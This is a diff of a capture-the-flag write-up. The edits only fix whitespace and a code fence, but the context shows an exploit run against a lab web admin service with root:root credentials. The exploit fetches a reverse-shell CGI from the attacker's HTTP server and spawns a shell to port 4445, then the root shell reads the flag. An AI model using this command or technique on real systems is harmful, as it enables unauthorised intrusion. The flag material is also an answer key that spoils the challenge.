@@ -42,8 +42,8 @@ Run the exploit.
 ```bash
 kali@kali:python3 exploit.py -t https://192.168.5.215:10000 -c root:root -LS 192.168.5.212:8080 -P 4445 -L 192.168.5.212
 
-[+] Generating payload to revshell.cgi in current directory                                                                            
-[+] Login Successful 
+[+] Generating payload to revshell.cgi in current directory
+[+] Login Successful
 [+] Attempt to host http.server on 8080
 
 [+] Sleep 3 second to ensure http server is up!
@@ -53,10 +53,10 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 [+] Fetching revshell.cgi from http.server 192.168.5.212:8080
 [+] Modifying permission of revshell.cgi to 0755
 
-[+] Success: shell spawned to 192.168.5.212 via port 4445 - XD                                                                         
+[+] Success: shell spawned to 192.168.5.212 via port 4445 - XD
 [+] Shell location: https://192.168.5.215:10000/revshell.cgi
 
-[+] Cleaning up                                                                                                                        
+[+] Cleaning up
 [+] Killing: http.server on port 8080
 ```
 
@@ -96,7 +96,7 @@ find / -name "*flag*" 2>/dev/null
 
 We find our flag at /etc/flag.
 
-``bash
+```bash
 root@ff2a9df53ccd:~# cat /etc/flag
 cat /etc/flag
 ThunderCipher{We.....3!!}
